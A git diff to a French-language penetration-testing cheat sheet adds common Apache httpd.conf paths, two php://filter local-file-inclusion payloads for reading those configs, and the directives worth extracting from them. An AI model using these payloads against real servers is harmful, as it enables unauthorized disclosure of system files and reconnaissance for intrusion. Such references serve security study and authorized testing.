@@ -26,7 +26,32 @@
 /etc/hosts
 /etc/hostname
 ```
+```
+# Emplacements courants de httpd.conf
 
+/etc/httpd/conf/httpd.conf          # CentOS / RHEL / Fedora
+/etc/apache2/apache2.conf           # Debian / Ubuntu (équivalent)
+/usr/local/apache2/conf/httpd.conf  # Compilation depuis les sources
+/usr/local/etc/apache24/httpd.conf  # FreeBSD
+/opt/lampp/etc/httpd.conf           # XAMPP
+C:\xampp\apache\conf\httpd.conf     # XAMPP Windows
+C:\Apache24\conf\httpd.conf         # Windows natif
+```
+
+**Via LFI**
+```
+php://filter/convert.base64-encode/resource=/etc/httpd/conf/httpd.conf
+php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+```
+
+**Ce qu'on cherche dedans**
+```
+DocumentRoot     → racine du site web
+ServerName       → vhosts / domaines
+CustomLog        → chemin exact des access.log
+ErrorLog         → chemin exact des error.log
+Include          → autres fichiers de config chargés
+```
 ---
 
 ## PHP
@@ -174,7 +199,7 @@
 /usr/local/etc/APP/*
 ```
 
-**Fichiers clés - Windows**
+# **Fichiers clés - Windows**
 
 ---
 
